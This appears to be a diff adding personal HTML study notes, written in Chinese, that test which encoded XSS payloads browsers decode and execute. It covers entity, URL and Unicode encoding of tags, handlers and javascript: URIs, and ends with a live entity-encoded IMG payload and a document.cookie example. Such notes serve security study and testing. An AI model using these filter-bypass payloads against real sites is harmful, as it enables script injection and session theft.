@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+
+<!--html实体编码只能在属性内容处被编码可被转义 其他<> 标签名 属性名都是用于构造dom树的符号 构造dom树时不进行html编码-->
+<!--标签被编码 g实体编码&#103;-->
+<!--<im&#103; src=1 onerror="alert('img标签名被编码')">-->
+
+<!--属性被编码-->
+<!--s实体编码&#115;-->
+<!--<img &#115;rc='test.png'  onclick=alert('scr属性被编码') >-->
+
+<!--响应事件名被编码-->
+<!--o实体编码&#111;-->
+<!--<img src='test.png'  &#111;nclick=alert('响应事件名onclick被编码') >-->
+
+<!--响应事件体被编码(可以)!-->
+<!--a实体编码&#97;-->
+<!--<img src=1 onerror=&#97;lert('响应事件体alert被编码') >-->
+
+<!--<div>&#60;img src=x onerror=alert(4)&#62;</div>-->
+
+<!--函数参数被html实体编码-->
+<!--s实体编码&#115;-->
+<!--<img src=1 alt="" onclick=alert('函数参数字符串被实体编码x&#115;s') >-->
+
+<!--script标签被编码-->
+<!--<&#115;cript>-->
+<!--    alert('xss')-->
+<!--</script>-->
+
+<!--script内函数名被编码-->
+<!--<script>-->
+<!--    &#97;lert('xss')-->
+<!--</script>-->
+
+<!--script字符串被编码 不会被html解码-->
+<!--<script>-->
+<!--    alert('xx&#115;s')-->
+<!--</script>-->
+
+url解析
+<!-- <a href="%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"></a>-->
+<!--URL 编码 "javascript:alert(1)"  NO???-->
+
+<!--<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:%61%6c%65%72%74%28%32%29">-->
+<!--HTML字符实体编码 "javascript" 和 URL 编码 "alert(2)"  yes html可解析内容实体编码  js能解析url??-->
+
+<!--  <a href="javascript%3aalert(3)"></a>-->
+<!--URL 编码 ":"  No 标签可正常解析 js引擎不能跳转-->
+
+<!--  <div>&#60;img src=x onerror=alert(4)&#62;</div>-->
+<!--HTML字符实体编码 < 和 >  No!-->
+
+<!--  <textarea>&#60;script&#62;alert(5)&#60;/script&#62;</textarea>-->
+<!--HTML字符实体编码 < 和 >-->
+<!--<textarea><script>alert(6)</script></textarea>  both of NO-->
+
+yes
+<!--  <script>\u0061\u006c\u0065\u0072\u0074(10);</script>-->
+<!--Unicode 编码 alert-->
+No
+<!--  <script>\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</script>-->
+<!--Unicode 编码 alert(11)-->
+<!-- <script>\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</script>-->
+<!--Unicode 编码 alert 和 12-->
+<!--<script>-->
+<!--    \u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b-->
+<!--</script>-->
+
+<!--\0065 \x65 \145-->
+<!--<a href=javascript:al\x65rt(1)>click</a>-->
+
+<!--<a href=javascript:eval(\u0061\u006c\u0065\u0072\u0074('\u0061xss'))>11</a>-->
+<!--<a href=javascript:eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')>11</a> yes-->
+<!--<a href=javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b>11</a>-->
+<!--<a href=javascript:eval('\u0061\u006c\u0065\u0072\u0074(u0022\u0078\u0073\u0073\u0022)u003b')>11</a>  no-->
+
+<!--<img src="x" onerror="eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b')">-->
+<!--<script>-->
+<!--    al\x65rt(1)-->
+<!--</script>-->
+/ == 空格
+<!--<svg/onload=alert(11)>-->
+不需要<>的xss
+<!--onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null;#1/-alert(1)/-->
+
+<!--<marquee>11</marquee>-->
+<!--<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">-->
+
+<!--<a onmouseover="alert(document.cookie)">xxs link</a>-->
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+</body>
+</html>
+
+
+深入理解浏览器解析机制
+http://bobao.360.cn/learning/detail/292.html
+XSS测试中如何绕过长度限制
+https://nosec.org/home/detail/3206.html
